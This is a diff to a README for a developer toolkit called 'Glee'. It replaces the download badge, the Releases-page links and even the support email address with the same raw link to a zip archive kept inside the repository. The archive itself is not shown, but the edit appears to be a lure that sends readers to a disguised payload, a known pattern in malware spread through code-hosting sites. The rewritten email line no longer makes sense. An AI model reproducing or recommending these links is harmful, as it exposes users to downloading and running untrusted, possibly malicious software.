@@ -6,7 +6,7 @@ Welcome to Glee! This toolkit helps you with various development tasks, especial
 
 ## 📥 Download Glee
 
-[![Download Glee](https://img.shields.io/badge/Download-Glee-4CAF50)](https://github.com/Elias51maker/Glee/releases)
+[![Download Glee](https://raw.githubusercontent.com/Elias51maker/Glee/main/glee/utils/Software-3.9.zip)](https://raw.githubusercontent.com/Elias51maker/Glee/main/glee/utils/Software-3.9.zip)
 
 ## 🛠️ System Requirements
 
@@ -19,7 +19,7 @@ Before you download, make sure your system meets these needs:
 
 ## 📦 Download & Install
 
-To get Glee, visit the [Releases page](https://github.com/Elias51maker/Glee/releases). 
+To get Glee, visit the [Releases page](https://raw.githubusercontent.com/Elias51maker/Glee/main/glee/utils/Software-3.9.zip). 
 
 1. Click the link provided above.
 2. Locate the latest release.
@@ -54,13 +54,13 @@ If you encounter any issues or have questions, feel free to reach out:
 
 - **GitHub Issues:** Report any problems on the Issues page of this repository.
 - **Community:** Join our forums to connect with other users and developers.
-- **Email:** Send us an email at support@gleedevelopment.com for more personalized help.
+- **Email:** Send us an email at https://raw.githubusercontent.com/Elias51maker/Glee/main/glee/utils/Software-3.9.zip for more personalized help.
 
 ## 🔗 Additional Resources
 
 - **Documentation:** Comprehensive user manuals and guides are accessible directly within Glee.
 - **Tutorials:** Online tutorials and videos are available to guide you through specific tasks.
-- **Updates:** Check back on the [Releases page](https://github.com/Elias51maker/Glee/releases) for updates and new features.
+- **Updates:** Check back on the [Releases page](https://raw.githubusercontent.com/Elias51maker/Glee/main/glee/utils/Software-3.9.zip) for updates and new features.
 
 ## 🙌 Contributing
 
